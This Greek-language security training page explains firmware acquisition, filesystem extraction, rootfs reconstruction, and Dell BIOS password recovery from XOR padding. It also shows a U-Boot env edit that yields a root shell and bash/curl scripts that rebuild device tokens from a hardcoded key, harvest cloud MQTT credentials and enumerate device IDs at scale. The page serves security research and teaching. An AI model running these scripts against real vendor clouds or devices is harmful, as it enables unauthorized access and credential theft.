# Ανάλυση Firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Εισαγωγή**

### Σχετικοί πόροι

Για απόκτηση μέσω εκτεθειμένων διεπαφών hardware, δείτε [απόρριψη firmware με υποβοήθηση κονσόλας UART](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) και [απόρριψη flash SPI](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Για επαναλήψιμη καταγραφή UART κατά την εκκίνηση, πριν από την πρόσβαση στην κονσόλα, δείτε [τροφοδοσία ελεγχόμενη μέσω SCPI και λήψη με παλμογράφο](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Το firmware είναι απαραίτητο λογισμικό που επιτρέπει στις συσκευές να λειτουργούν σωστά, διαχειριζόμενο και διευκολύνοντας την επικοινωνία μεταξύ των στοιχείων hardware και του λογισμικού με το οποίο αλληλεπιδρούν οι χρήστες. Αποθηκεύεται σε μόνιμη μνήμη, ώστε η συσκευή να έχει πρόσβαση σε ζωτικές οδηγίες από τη στιγμή που ενεργοποιείται, κάτι που οδηγεί στην εκκίνηση του λειτουργικού συστήματος. Η εξέταση και η πιθανή τροποποίηση του firmware είναι κρίσιμο βήμα για τον εντοπισμό ευπαθειών ασφαλείας.<sup>[[2]](#references)[[3]](#references)</sup>

## **Συλλογή πληροφοριών**

Η **συλλογή πληροφοριών** είναι ένα κρίσιμο αρχικό βήμα για την κατανόηση της σύνθεσης μιας συσκευής και των τεχνολογιών που χρησιμοποιεί. Αυτή η διαδικασία περιλαμβάνει τη συλλογή δεδομένων σχετικά με:

- Την αρχιτεκτονική CPU και το λειτουργικό σύστημα που εκτελεί
- Λεπτομέρειες για τον bootloader
- Τη διάταξη του hardware και τα datasheets
- Μετρικές της βάσης κώδικα και τοποθεσίες του πηγαίου κώδικα
- Εξωτερικές βιβλιοθήκες και τύπους αδειών χρήσης
- Ιστορικό ενημερώσεων και κανονιστικές πιστοποιήσεις
- Διαγράμματα αρχιτεκτονικής και ροής
- Αξιολογήσεις ασφαλείας και εντοπισμένες ευπάθειες

Για τον σκοπό αυτό, τα εργαλεία **open-source intelligence (OSINT)** είναι ανεκτίμητα, όπως και η ανάλυση τυχόν διαθέσιμων στοιχείων λογισμικού ανοιχτού κώδικα μέσω μη αυτόματων και αυτοματοποιημένων διαδικασιών ελέγχου. Εργαλεία όπως τα [Coverity Scan](https://scan.coverity.com) και [Semmle’s LGTM](https://lgtm.com/#explore) προσφέρουν δωρεάν static analysis, την οποία μπορείτε να αξιοποιήσετε για τον εντοπισμό πιθανών προβλημάτων.

## **Απόκτηση του Firmware**

Η απόκτηση firmware μπορεί να γίνει με διάφορους τρόπους, καθένας με διαφορετικό βαθμό πολυπλοκότητας:

- **Απευθείας** από την πηγή (προγραμματιστές, κατασκευαστές)
- **Δημιουργία** του από τις παρεχόμενες οδηγίες
- **Λήψη** από επίσημους ιστότοπους υποστήριξης
- Χρήση ερωτημάτων **Google dork** για την εύρεση φιλοξενούμενων αρχείων firmware
- Άμεση πρόσβαση σε **cloud storage**, με εργαλεία όπως το [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Υποκλοπή **ενημερώσεων** με τεχνικές man-in-the-middle
- **Εξαγωγή** από τη συσκευή μέσω συνδέσεων όπως **UART**, **JTAG** ή **PICit**
- **Παρακολούθηση** αιτημάτων ενημέρωσης στην επικοινωνία της συσκευής
- Εντοπισμός και χρήση **hardcoded endpoints ενημέρωσης**
- **Απόρριψη** από τον bootloader ή μέσω δικτύου
- **Αφαίρεση και ανάγνωση** του chip αποθήκευσης, αν αποτύχουν όλα τα άλλα, με χρήση κατάλληλων εργαλείων hardware

### Καταγραφές μόνο μέσω UART: επιβολή root shell μέσω του U-Boot env στο flash

Αν το UART RX αγνοείται (μόνο καταγραφές), μπορείτε και πάλι να επιβάλετε ένα init shell **επεξεργαζόμενοι offline το blob περιβάλλοντος του U-Boot**:<sup>[[6]](#references)</sup>

1. Απορρίψτε το SPI flash με ένα SOIC-8 clip και programmer (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Εντοπίστε το partition env του U-Boot, επεξεργαστείτε το `bootargs` ώστε να περιλαμβάνει το `init=/bin/sh` και **υπολογίστε ξανά το U-Boot env CRC32** για το blob.
3. Κάντε reflash μόνο στο partition env και επανεκκινήστε· θα πρέπει να εμφανιστεί ένα shell στο UART.

Αυτό είναι χρήσιμο σε embedded συσκευές όπου το shell του bootloader είναι απενεργοποιημένο, αλλά το partition env είναι εγγράψιμο μέσω εξωτερικής πρόσβασης στο flash.

## Ανάλυση του firmware

Τώρα που **έχετε το firmware**, πρέπει να εξαγάγετε πληροφορίες γι’ αυτό, ώστε να γνωρίζετε πώς να το χειριστείτε. Μερικά εργαλεία που μπορείτε να χρησιμοποιήσετε γι’ αυτό:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Αν δεν βρείτε πολλά με αυτά τα εργαλεία, ελέγξτε την **εντροπία** της εικόνας με `binwalk -E <bin>`. Αν είναι χαμηλή, τότε μάλλον δεν είναι κρυπτογραφημένη. Αν είναι υψηλή, πιθανότατα είναι κρυπτογραφημένη (ή συμπιεσμένη με κάποιον τρόπο).

Επιπλέον, μπορείτε να χρησιμοποιήσετε αυτά τα εργαλεία για να εξαγάγετε **αρχεία ενσωματωμένα στο firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ή το [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) για να επιθεωρήσετε το αρχείο.

### Διαφορική ανάλυση flash και ανακτήσιμες αποθήκες μυστικών XOR

Όταν μια ρύθμιση firmware δεν έχει τεκμηριωμένη μορφή αποθήκευσης, αρχικά λάβετε αρκετές αντίστοιχες αναγνώσεις flash, αλλάξτε **ακριβώς μία** ρύθμιση, δημιουργήστε ξανά dump ολόκληρου του chip και συγκρίνετε τις μετατοπίσεις. Επαναλαμβάνοντας το πείραμα με ελεγχόμενες τιμές, μπορείτε να ξεχωρίσετε τη ρύθμιση από τους μετρητές και τα μεταδεδομένα εγγραφής· οι αλλαγές σε νέες μετατοπίσεις αντί για επιτόπου υποδεικνύουν αποθήκευση μόνο με προσθήκη ή με δομή αρχείου καταγραφής. Διατηρήστε τις διαγραμμένες εγγραφές/εγγραφές με tombstone, επειδή τα byte των δεδομένων τους μπορεί να παραμένουν ανακτήσιμα.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

After locating the region, εξαγάγετε τα firmware modules με εργαλεία όπως το `binwalk` και κάντε reverse engineering του writer/validator στο Ghidra. Επιβεβαιώστε τα όρια των πεδίων, το padding, το key indexing και το key derivation στον κώδικα, αντί να συμπεραίνετε το scheme μόνο από μοτίβα ciphertext.<sup>[[12]](#references)</sup>

#### Ανάκτηση keys από encrypted zero padding

Όπως περιγράφεται στο [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), το γνωστό plaintext αποκαλύπτει bytes του keystream στις ίδιες θέσεις. Ένα πεδίο σταθερού μεγέθους είναι ιδιαίτερα εκτεθειμένο όταν το zero padding του καλύπτει κάθε θέση ενός επαναλαμβανόμενου XOR key: το encrypted padding αποκαλύπτει απευθείας αυτά τα bytes του key, επειδή `0x00 XOR key_byte = key_byte`. Αν καλύπτονται όλες οι θέσεις του key, ανακατασκευάστε το key από το τέλος του ciphertext και αποκρυπτογραφήστε τα bytes που περιέχουν δεδομένα.<sup>[[12]](#references)</sup>

Η ευάλωτη μορφή κωδικού πρόσβασης BIOS DVAR της Dell είναι ένα συγκεκριμένο παράδειγμα: το byte `0` ενός πεδίου 32 bytes είναι plaintext, ενώ τα bytes `1..31` χρησιμοποιούν ένα επαναλαμβανόμενο key 20 bytes.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Για μήκος κωδικού πρόσβασης `L`, οι θέσεις `L..31` ήταν μηδενικές πριν από το XOR. Όταν `L <= 12`, αυτές οι θέσεις καλύπτουν κάθε δείκτη κλειδιού, επομένως ανακτώνται ολόκληρο το κλειδί και ο κωδικός πρόσβασης χωρίς brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Ανάκτηση κλειδιών από ιστορικές εγγραφές

Μην αναλύετε κάθε εγγραφή ανεξάρτητα. Το κλειδί DVAR προκύπτει κατά προσέγγιση ως `modified_md5(device_seed || variable_GUID || password[0])`: το device seed και το GUID είναι σταθερά, ενώ η μόνη είσοδος που εξαρτάται από τον κωδικό πρόσβασης είναι το πρώτο byte σε καθαρή μορφή. Αυτό δίνει έως 256 κλειδιά ανά συσκευή και οι εγγραφές που αρχίζουν με το ίδιο byte μοιράζονται ένα κλειδί. Ομαδοποιήστε τις ενεργές και διαγραμμένες εγγραφές βάσει αυτού του byte· μια σύντομη ιστορική εγγραφή μπορεί να αποκαλύψει ολόκληρο το κλειδί μέσω του padding και να αποκρυπτογραφήσει μια τρέχουσα, μεγαλύτερη εγγραφή, της οποίας το padding δεν επαρκεί. Επομένως, η αλλαγή κωδικού πρόσβασης μπορεί να αυξήσει την έκθεση, όταν το παλιό ciphertext επισημαίνεται ως διαγραμμένο αντί να διαγράφεται.<sup>[[12]](#references)</sup>

Το εργαλείο [`dellpwn`](https://github.com/R3n5k1/dellpwn) εντοπίζει DVAR, επικυρώνει υποψήφιες εγγραφές, ανακτά κωδικούς πρόσβασης και μπορεί να εμφανίσει τα ακατέργαστα αποθηκευμένα byte και byte κλειδιών. Δημιουργήστε το από ένα checkout και σαρώστε μια επαληθευμένη εικόνα flash ως εξής:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Για custom parsers, απορρίψτε τα false positives με βάση τη δομή των εγγραφών, τους περιορισμούς εκτυπώσιμων χαρακτήρων, τους ελέγχους zero-padding, την εντροπία του κλειδιού και τη συνέπεια όταν το κλειδί κάνει wrap. Αν επαναλαμβανόμενα dumps εμφανίζουν αραιές αλλαγές bit ανά εγγραφή, καταγράψτε τις μάσκες που παρατηρήθηκαν και κατατάξτε τις διορθώσεις με βάση αυτούς τους περιορισμούς, αλλά αναφέρετε τους αμφίσημους χαρακτήρες αντί να παρουσιάζετε ευρετικά αποτελέσματα ως ακριβή ανάκτηση.<sup>[[12]](#references)</sup>

Τα password verifiers θα πρέπει να αποθηκεύουν salted, επαναληπτικά one-way hashes αντί για αναστρέψιμο ciphertext, ενώ τα log-structured stores θα πρέπει να διαγράφουν με ασφάλεια τα υλικά μυστικών που έχουν αντικατασταθεί.<sup>[[12]](#references)</sup>

### Ανάκτηση του Συστήματος Αρχείων

Με τα προηγούμενα εργαλεία με σχόλια, όπως το `binwalk -ev <bin>`, θα έπρεπε να έχετε μπορέσει να **εξαγάγετε το σύστημα αρχείων**.\
Το Binwalk συνήθως το εξάγει σε έναν **φάκελο με όνομα τον τύπο του συστήματος αρχείων**, που συνήθως είναι ένας από τους εξής: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Χειροκίνητη Εξαγωγή Συστήματος Αρχείων

Μερικές φορές, το binwalk **δεν έχει το magic byte του συστήματος αρχείων στις υπογραφές του**. Σε αυτές τις περιπτώσεις, χρησιμοποιήστε το binwalk για να **βρείτε το offset του συστήματος αρχείων και να κάνετε carve το συμπιεσμένο σύστημα αρχείων** από το binary και να **εξαγάγετε χειροκίνητα** το σύστημα αρχείων ανάλογα με τον τύπο του, χρησιμοποιώντας τα παρακάτω βήματα.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Εκτελέστε την ακόλουθη **εντολή dd** για να εξαγάγετε το σύστημα αρχείων Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Εναλλακτικά, μπορεί να εκτελεστεί και η ακόλουθη εντολή.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Για squashfs (που χρησιμοποιείται στο παραπάνω παράδειγμα)

`$ unsquashfs dir.squashfs`

Τα αρχεία θα βρίσκονται στη συνέχεια στον κατάλογο "`squashfs-root`".

- Αρχεία αρχειοθέτησης CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Για συστήματα αρχείων jffs2

`$ jefferson rootfsfile.jffs2`

- Για συστήματα αρχείων ubifs με NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Ανακατασκευή διαχωρισμένων ενσωματωμένων root filesystems

Αν ένα raw dump eMMC/SSD περιέχει έγκυρη κεφαλίδα συστήματος αρχείων, αλλά τα offsets των μεταδεδομένων του εκτείνονται πέρα από το ονομαστικό partition, μην το χαρακτηρίσετε αμέσως ως κατεστραμμένο. Ο ενσωματωμένος κώδικας εκκίνησης μπορεί να συναρμολογήσει την πραγματική root device από πολλαπλές φυσικές περιοχές με το Device Mapper, οπότε η εξαγωγή δεδομένων από ένα GPT partition παράγει μόνο το πρώτο τμήμα.<sup>[[9]](#references)</sup>

#### Διαλογή του πλήρους image του μέσου

Αρχικά, επαληθεύστε ότι η απόκτηση έχει ολοκληρωθεί, το μέγεθος είναι σταθερό και κανένας writer δεν διατηρεί ανοιχτό το image. Αν το όνομα του αρχείου κωδικοποιεί μια διεύθυνση έναρξης/λήξης, συγκρίνετε αυτό το εύρος με τον πραγματικό αριθμό byte. Ανακτήστε το GPT σε λειτουργία μόνο για ανάγνωση και προσαρτήστε μόνο το απαιτούμενο εύρος· **μην** εκτελέσετε `vgchange -ay` σε μη έμπιστο physical volume στον workstation, επειδή ενδέχεται να προκύψουν συγκρούσεις μεταξύ volume group και ακούσιες εγγραφές.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Προτιμήστε μια αναλώσιμη VM όταν η αρχική λογική init ή μια στοίβα LVM πρέπει να επεξεργαστεί ολόκληρο το image. Τα ιστορικά boot logs από ένα τυπικό boot partition είναι ιδιαίτερα χρήσιμα: ο bootloader μπορεί να έχει καταγράψει offsets proprietary containers, μήκη components, επιλογή slot, κανόνες ευθυγράμμισης και επαλήθευση υπογραφών. Χρησιμοποιήστε αυτές τις τιμές για να εξαγάγετε ένα embedded command line/kernel/initramfs και, στη συνέχεια, επικυρώστε κάθε έξοδο ξεχωριστά με `file`, magic bytes και `binwalk`. Η ανάγνωση μέχρι το τέλος του container μπορεί κατά λάθος να προσθέσει ένα initrd, ένα αντικείμενο ACPI ή μια υπογραφή στον kernel.<sup>[[9]](#references)</sup>

#### Ανάκτηση του block map κατά την εκκίνηση

Εξαγάγετε το initramfs του kernel και κάντε reverse engineering στο `/init` και σε τυχόν βιβλιοθήκες αποθήκευσης. Στο [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), ακολουθήστε τις αναφορές συμβολοσειρών για τα `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` και τις διαδρομές partition· στη συνέχεια, εντοπίστε τον κώδικα που επιλέγει το ενεργό A/B slot και δημιουργεί τον πίνακα. Χρήσιμα σημεία εκκίνησης στο radare2 είναι τα `r2 -A init`, `afl`, `pdf @ main` και `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Ο στόχος linear αντιστοιχίζει διαδοχικές περιοχές μιας εικονικής συσκευής σε περιοχές μίας ή περισσότερων συσκευών υποστήριξης. Ένας πίνακας δύο τμημάτων που έχει ανακτηθεί έχει συνήθως την εξής μορφή (όλες οι θέσεις και τα μήκη είναι σε sectors των 512 byte):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Αναπαράγετε με ακρίβεια την αριθμητική του machine code, συμπεριλαμβανομένων του πλάτους των ακεραίων, των ολισθήσεων και των μετατροπών μονάδων. Για παράδειγμα, η ακόλουθη έκφραση στρογγυλοποιεί προς τα κάτω ένα μέγεθος σε byte στο όριο των 4 KiB και μόνο κατόπιν το μετατρέπει σε τομείς των 512 byte· αν την αντικαταστήσετε με `p4_bytes // 512`, η επιλεγμένη ουρά μετατοπίζεται κατά `p4_bytes % 4096` κάθε φορά που το partition δεν είναι ευθυγραμμισμένο σε όριο σελίδας.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Ανακατασκευάστε μια επίπεδη εικόνα ανάλυσης αντιγράφοντας τα εύρη με τη σειρά του πίνακα και χρησιμοποιώντας περιορισμένα τμήματα, αντί να φορτώσετε ολόκληρο το media dump στη μνήμη. Έτσι αποφεύγετε επίσης τη δημιουργία host-side mapper devices. Διατηρήστε τα offsets που προκύπτουν από το GPT, τους ανεστραμμένους αριθμούς τομέων και το τελικό μήκος εξόδου ως ξεχωριστές assertions.<sup>[[9]](#references)</sup>

#### Ξεχωρίστε την αλλοίωση από ένα σταθερό σφάλμα ανακατασκευής

Για το SquashFS, ελέγξτε το magic `hsqs` και αποκωδικοποιήστε το πεδίο `bytes_used` 64-bit little-endian στο offset 40 του superblock πριν εκτελέσετε το `unsquashfs`. Αν η εξαγωγή αποτύχει σε αρκετές άσχετες δομές, αναζητήστε σε ένα ευρύ παράθυρο γύρω από τις αναμενόμενες θέσεις και απαιτήστε ισχυρές δομικές ενδείξεις: ένα block metadata που μπορεί να αποσυμπιεστεί, αρκετές διαδοχικές έγκυρες καταχωρίσεις καταλόγου, εύλογα πεδία inode, ένα root inode συμβατό με τον αριθμό των inode ή έγκυρη δομή integrity metadata. Μία μόνο αντιστοιχία magic δεν αρκεί.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Όταν το ίδιο signed delta καθιστά έγκυρες ανεξάρτητες δομές — για παράδειγμα, τα metadata καταλόγου και μια εγγραφή verity — η πιθανότερη αιτία είναι συστηματικό σφάλμα στην αρχή του segment και όχι bytes που λείπουν. Επιστρέψτε στην αντίστροφη αριθμητική και αναζητήστε απορριφθέντα υπόλοιπα, signedness, overflow ή στρογγυλοποίηση σε όρια sector/page προτού επιχειρήσετε ανάκτηση orphan ή διόρθωση των metadata του filesystem.<sup>[[9]](#references)</sup>

Τέλος, διατηρήστε ξεχωριστά τα όρια προστασίας: οι τόμοι LUKS που είναι σφραγισμένοι με TPM προστατεύουν την εμπιστευτικότητα των δεδομένων, ενώ ένα signed dm-verity mapping προστατεύει την ακεραιότητα του root filesystem. Ένα software TPM δεν ανακτά ένα κλειδί που έχει σφραγιστεί στο αρχικό φυσικό TPM, και η εκκίνηση ενός τροποποιημένου SquashFS μέσω ενός init μόνο για έρευνα, το οποίο παραλείπει την επαλήθευση verity, δεν πλαστογραφεί την υπογραφή του ούτε παραβιάζει το dm-verity.<sup>[[9]](#references)</sup>

## Ανάλυση Firmware

Μόλις ληφθεί το firmware, είναι απαραίτητο να το εξετάσετε για να κατανοήσετε τη δομή του και τις πιθανές ευπάθειές του. Αυτή η διαδικασία περιλαμβάνει τη χρήση διαφόρων εργαλείων για την ανάλυση και την εξαγωγή χρήσιμων δεδομένων από το image του firmware.

### Εργαλεία αρχικής ανάλυσης

Παρακάτω παρατίθεται ένα σύνολο εντολών για την αρχική επιθεώρηση του binary αρχείου (που αναφέρεται ως `<bin>`). Αυτές οι εντολές βοηθούν στον εντοπισμό τύπων αρχείων, στην εξαγωγή strings, στην ανάλυση binary δεδομένων και στην κατανόηση των λεπτομερειών των partitions και των filesystems:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Για να αξιολογηθεί η κατάσταση κρυπτογράφησης της εικόνας, ελέγχεται η **εντροπία** με την εντολή `binwalk -E <bin>`. Η χαμηλή εντροπία υποδηλώνει απουσία κρυπτογράφησης, ενώ η υψηλή εντροπία υποδηλώνει πιθανή κρυπτογράφηση ή συμπίεση.

Για την εξαγωγή **ενσωματωμένων αρχείων**, συνιστώνται εργαλεία και πόροι όπως η τεκμηρίωση **file-data-carving-recovery-tools** και το **binvis.io** για επιθεώρηση αρχείων.

### Εξαγωγή του συστήματος αρχείων

Με την εντολή `binwalk -ev <bin>`, συνήθως μπορεί να εξαχθεί το σύστημα αρχείων, συχνά σε έναν κατάλογο με όνομα που αντιστοιχεί στον τύπο του συστήματος αρχείων (π.χ. squashfs, ubifs). Ωστόσο, όταν το **binwalk** αποτυγχάνει να αναγνωρίσει τον τύπο του συστήματος αρχείων λόγω απουσίας magic bytes, απαιτείται χειροκίνητη εξαγωγή. Αυτό περιλαμβάνει τη χρήση του `binwalk` για τον εντοπισμό της μετατόπισης του συστήματος αρχείων και, στη συνέχεια, της εντολής `dd` για την απομόνωσή του:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Στη συνέχεια, ανάλογα με τον τύπο του συστήματος αρχείων (π.χ. squashfs, cpio, jffs2, ubifs), χρησιμοποιούνται διαφορετικές εντολές για τη μη αυτόματη εξαγωγή των περιεχομένων.

### Ανάλυση συστήματος αρχείων

Αφού εξαχθεί το σύστημα αρχείων, ξεκινά η αναζήτηση για αδυναμίες ασφαλείας. Εξετάζονται μη ασφαλείς network daemons, hardcoded διαπιστευτήρια, API endpoints, λειτουργίες διακομιστών ενημερώσεων, μη μεταγλωττισμένος κώδικας, scripts εκκίνησης και compiled binaries για offline ανάλυση.

**Βασικές τοποθεσίες** και **στοιχεία** προς επιθεώρηση:

- Τα **etc/shadow** και **etc/passwd** για διαπιστευτήρια χρηστών
- Πιστοποιητικά και κλειδιά SSL στο **etc/ssl**
- Αρχεία ρυθμίσεων και scripts για πιθανές ευπάθειες
- Embedded binaries για περαιτέρω ανάλυση
- Συνήθεις web servers και binaries συσκευών IoT

Διάφορα εργαλεία βοηθούν στον εντοπισμό ευαίσθητων πληροφοριών και ευπαθειών στο σύστημα αρχείων:

- Τα [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) και [**Firmwalker**](https://github.com/craigz28/firmwalker) για την αναζήτηση ευαίσθητων πληροφοριών
- Το [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) για ολοκληρωμένη ανάλυση firmware
- Τα [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) και [**EMBA**](https://github.com/e-m-b-a/emba) για στατική και δυναμική ανάλυση

### Έλεγχοι ασφαλείας σε compiled binaries

Τόσο ο πηγαίος κώδικας όσο και τα compiled binaries που εντοπίζονται στο σύστημα αρχείων πρέπει να εξετάζονται για ευπάθειες. Εργαλεία όπως το **checksec.sh** για Unix binaries και το **PESecurity** για Windows binaries βοηθούν στον εντοπισμό μη προστατευμένων binaries που θα μπορούσαν να αποτελέσουν αντικείμενο εκμετάλλευσης.

## Συλλογή cloud config και MQTT διαπιστευτηρίων μέσω URL tokens που παράγονται από τη συσκευή

Πολλά IoT hubs αντλούν τις ρυθμίσεις τους ανά συσκευή από ένα cloud endpoint που έχει τη μορφή:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Κατά την ανάλυση firmware, μπορεί να διαπιστώσετε ότι το `<token>` παράγεται τοπικά από το device ID, χρησιμοποιώντας ένα hardcoded secret, για παράδειγμα:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Αυτός ο σχεδιασμός επιτρέπει σε οποιονδήποτε γνωρίζει ένα deviceId και το STATIC_KEY να ανακατασκευάσει το URL και να αντλήσει το cloud config, αποκαλύπτοντας συχνά plaintext MQTT διαπιστευτήρια και prefixes θεμάτων.

Πρακτική διαδικασία:

1) Εξαγάγετε το deviceId από τα UART boot logs

- Συνδέστε έναν προσαρμογέα UART 3.3V (TX/RX/GND) και καταγράψτε τα logs:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Εντοπίστε γραμμές που εμφανίζουν το μοτίβο URL της cloud config και τη διεύθυνση του broker, για παράδειγμα:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Ανάκτηση του STATIC_KEY και του αλγορίθμου token από το firmware

- Φορτώστε τα binaries στο Ghidra/radare2 και αναζητήστε τη διαδρομή config ("/pf/") ή χρήση MD5.
- Επιβεβαιώστε τον αλγόριθμο (π.χ., MD5(deviceId||STATIC_KEY)).
- Υπολογίστε το token στο Bash και μετατρέψτε το digest σε κεφαλαία:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Συλλογή cloud config και διαπιστευτηρίων MQTT

- Συνθέστε το URL και ανακτήστε το JSON με curl· αναλύστε το με jq για να εξαγάγετε secrets:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Εκμεταλλευτείτε το plaintext MQTT και τα αδύναμα topic ACLs (αν υπάρχουν)

- Χρησιμοποιήστε τα ανακτημένα διαπιστευτήρια για να εγγραφείτε σε maintenance topics και να αναζητήσετε ευαίσθητα συμβάντα:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Απαριθμήστε προβλέψιμα device IDs (σε μεγάλη κλίμακα, με εξουσιοδότηση)

- Πολλά οικοσυστήματα ενσωματώνουν bytes OUI/προϊόντος/τύπου του vendor, ακολουθούμενα από ένα διαδοχικό επίθημα.
- Μπορείτε να δοκιμάσετε candidate IDs, να παράγετε tokens και να ανακτάτε configs μέσω προγραμματισμού:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Σημειώσεις
- Να λαμβάνετε πάντα ρητή εξουσιοδότηση πριν επιχειρήσετε mass enumeration.
- Όπου είναι δυνατό, προτιμήστε την εξομοίωση ή τη στατική ανάλυση για την ανάκτηση μυστικών χωρίς τροποποίηση του υλικού-στόχου.

Η διαδικασία εξομοίωσης firmware επιτρέπει **δυναμική ανάλυση** είτε της λειτουργίας μιας συσκευής είτε ενός μεμονωμένου προγράμματος. Αυτή η προσέγγιση μπορεί να αντιμετωπίσει δυσκολίες λόγω εξαρτήσεων από το υλικό ή την αρχιτεκτονική, αλλά η μεταφορά του root filesystem ή συγκεκριμένων binaries σε μια συσκευή με αντίστοιχη αρχιτεκτονική και endianness, όπως ένα Raspberry Pi, ή σε μια προδιαμορφωμένη εικονική μηχανή, μπορεί να διευκολύνει περαιτέρω δοκιμές.

### Εξομοίωση μεμονωμένων Binaries

Για την εξέταση μεμονωμένων προγραμμάτων, είναι κρίσιμο να προσδιορίσετε το endianness και την αρχιτεκτονική CPU του προγράμματος.

